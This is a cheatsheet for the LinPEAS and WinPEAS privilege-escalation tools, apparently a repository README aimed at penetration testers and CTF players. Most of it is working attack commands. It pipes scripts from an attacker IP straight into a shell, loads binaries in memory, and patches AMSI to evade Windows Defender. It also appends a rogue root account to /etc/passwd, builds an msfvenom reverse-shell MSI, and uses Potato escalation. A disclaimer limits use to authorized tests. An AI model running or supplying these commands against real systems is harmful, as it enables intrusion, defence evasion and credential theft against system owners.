# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```

<p align="center">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<p align="center">
  <b>🔍 The world's most popular automated privilege escalation tools for Linux and Windows systems</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Color Legend & How to Read Output](#-color-legend--how-to-read-output)
- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-escalation)
  - [Download & In-Memory Execution](#download--in-memory-execution)
  - [Command-Line Options](#command-line-options)
  - [Core Vectors Checked by LinPEAS](#core-vectors-checked-by-linpeas)
  - [Stealth & AV Evasion](#stealth--av-evasion)
- [WinPEAS (Windows Privilege Escalation)](#-winpeas-windows-privilege-escalation)
  - [Execution Methods (.exe vs .bat)](#execution-methods-exe-vs-bat)
  - [Running WinPEAS in Memory](#running-winpeas-in-memory)
  - [Core Vectors Checked by WinPEAS](#core-vectors-checked-by-winpeas)
  - [Bypassing Windows Defender & AMSI](#bypassing-windows-defender--amsi)
- [Interpreting High-Priority Findings](#-interpreting-high-priority-findings)
- [Quick Reference Table](#-quick-reference-table)
- [Tips & Best Practices](#-tips--best-practices)
- [Legal Disclaimer](#-legal-disclaimer)
- [Resources](#-resources)

---

## 🎯 Introduction

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - new generation), created by Carlos Polop, is the de-facto standard collection of automated auditing tools used to uncover privilege escalation vectors on compromised systems:

- **LinPEAS:** An all-in-one Bash script that searches for misconfigurations, credentials, writable files, SUID binaries, kernel exploits, cron jobs, and containers on Linux/Unix systems.
- **WinPEAS:** Available as a standalone compiled .NET binary (`winPEASany.exe`, `winPEASx64.exe`) and lightweight batch script (`winPEAS.bat`) for auditing Windows workstations, domain members, and servers.

---

## 🎨 Color Legend & How to Read Output

The defining power of PEASS is its automated color rating system:

| Color | Significance | Meaning |
|-------|--------------|---------|
| 🔴 **RED/YELLOW** | 🚨 **CRITICAL (99% PrivEsc)** | Highly reliable privilege escalation vector. Must check immediately! |
| 🔴 **RED** | ⚠️ **Interesting** | Unusual configuration, non-default setting, or credential candidate. |
| 🟡 **YELLOW** | ℹ️ **Informative** | Noticeable finding that might be part of an exploit chain. |
| 🔵 **CYAN / BLUE** | 👥 **Context** | Users, groups, and standard system information. |

> **Golden Rule:** Scroll directly to **RED/YELLOW** highlights first! If you see text with a yellow background and red letters, an exploit vector is almost guaranteed.

---

## 🐧 LinPEAS (Linux Privilege Escalation)

### Download & In-Memory Execution

You rarely need to write `linpeas.sh` to disk. Execute it directly in memory using standard UNIX utilities:

```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```

### Command-Line Options

```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```

### Core Vectors Checked by LinPEAS

1. **Sudo Misconfigurations (`sudo -l`):**
   - Commands runnable as root without password (`NOPASSWD`).
   - Sudo token reuse / CVE-2021-3156 (Baron Samedit).
2. **SUID / SGID Binaries:**
   - Binaries with root permissions (`chmod +s`). Cross-referenced against **GTFOBins**.
3. **Linux Capabilities:**
   - Binaries with elevated capabilities like `cap_setuid+ep` (e.g., `python3`, `tar`, `perl`).
4. **Scheduled Tasks & Timers:**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) and writable scheduled scripts.
   - Systemd timers (`systemctl list-timers`).
5. **Path & Environment Hijacking:**
   - Writable directories in `$PATH`, relative command lookups in scripts.
6. **Kernel Exploitation:**
   - Kernel version checked against known exploits (Dirty COW, Dirty Pipe, OverlayFS).
7. **NFS Root Squashing:**
   - Shared directories mounted with `no_root_squash` in `/etc/exports`.
8. **Credential Harvesting:**
   - Cleartext passwords in `.bash_history`, configuration files (`wp-config.php`, `.env`), SSH keys (`id_rsa`), and memory dumps.

---

## 🪟 WinPEAS (Windows Privilege Escalation)

### Execution Methods (.exe vs .bat)

WinPEAS is provided in multiple formats:
- **`winPEASx64.exe` / `winPEASany.exe`:** Written in C#/.NET. Most comprehensive; performs deep registry, API, and credential checks.
- **`winPEAS.bat`:** Plain batch script. Highly compatible with legacy Windows versions, requires no .NET dependencies, and evades certain static binary detections.

```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```

### Running WinPEAS in Memory

To avoid saving files to disk on audited workstations, load WinPEAS directly into PowerShell memory:

```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```

### Core Vectors Checked by WinPEAS

1. **Service Permissions & Unquoted Paths:**
   - **Unquoted Service Paths:** Service binary paths with spaces and no quotes (`C:\Program Files\App\service.exe` -> attacker places `C:\Program.exe`).
   - **Weak Service Permissions:** Non-admin users having `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`.
2. **DLL Hijacking:**
   - Services attempting to load non-existent DLLs from user-writable directories.
3. **AlwaysInstallElevated:**
   - Registry keys `AlwaysInstallElevated = 1` allowing any user to install elevated MSI packages with `msiexec`.
4. **Token Privileges (SeImpersonate / SeAssignPrimaryToken):**
   - Exploitable via Potato exploits (SweetPotato, GodPotato, PrintSpoofer) to elevate from service accounts (`IIS APPPOOL`, `LOCAL SERVICE`) to `NT AUTHORITY\SYSTEM`.
5. **Credential Stores & Autologon:**
   - Cleartext passwords in Registry (`DefaultPassword` in Winlogon).
   - Saved RDP connections, Vault credentials, DPAPI blobs, PuTTY sessions, WiFi passwords.
6. **SAM & SYSTEM Backup Files:**
   - Writable or readable copies of `C:\Windows\Repair\SAM` or `C:\Windows\System32\config\RegBack\SAM`.

### Bypassing Windows Defender & AMSI

Windows Defender actively flags compiled versions of `winPEASx64.exe`. To run WinPEAS in monitored environments:

```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```

---

## 🎯 Interpreting High-Priority Findings

### 1. LinPEAS: Writable `/etc/passwd`
If LinPEAS marks `/etc/passwd` in **RED/YELLOW**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

### 2. WinPEAS: `SeImpersonatePrivilege` Present
If you hold `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```

### 3. WinPEAS: `AlwaysInstallElevated` Set to 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```

---

## 📊 Quick Reference Table

| Target | Command | Purpose |
|--------|---------|---------|
| **Linux (Remote)** | `curl -L http://<IP>/linpeas.sh \| sh` | In-memory execution without touching disk |
| **Linux (Local)** | `./linpeas.sh -a > out.txt` | Complete audit saved to text file |
| **Linux (Fast)** | `./linpeas.sh -q` | Fast scan skipping slow file searches |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Fast execution with reduced noise |
| **Windows (Memory)**| `[System.Reflection.Assembly]::Load($pe)` | Load .NET binary in memory via PowerShell |
| **Windows (Batch)** | `winPEAS.bat` | Dependency-free execution for legacy/AV evasion |

---

## 💡 Tips & Best Practices

1. **Review Output Using `less -r`:**
   When redirecting output to a file (`./linpeas.sh > linpeas.txt`), always view it using `less -r linpeas.txt` or `cat linpeas.txt` so terminal ANSI color escape codes render properly.
2. **Transfer via Port 80/443:**
   When staging LinPEAS or WinPEAS on your attacker box, host your web server on port `80` or `443` using `python3 -m http.server 80` to bypass strict target firewall egress rules.
3. **Don't Overlook Hidden Credentials:**
   Check the "Interesting Files" and "Cloud Credentials" sections of LinPEAS output; often plain-text API tokens or AWS credentials grant higher privileges than a local exploit.

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** PEASS-ng scripts perform comprehensive internal auditing and configuration discovery. They must only be executed on systems where you have documented permission during authorized penetration tests, CTF exercises, or internal security audits.

---

## 📚 Resources

- [PEASS-ng Official GitHub Repository](https://github.com/carlospolop/PEASS-ng)
- [HackTricks Cloud & Privilege Escalation Bible](https://book.hacktricks.xyz/)
- [GTFOBins - Unix Binaries Exploitation](https://gtfobins.github.io/)
- [LOLBAS - Windows Living Off The Land](https://lolbas-project.github.io/)
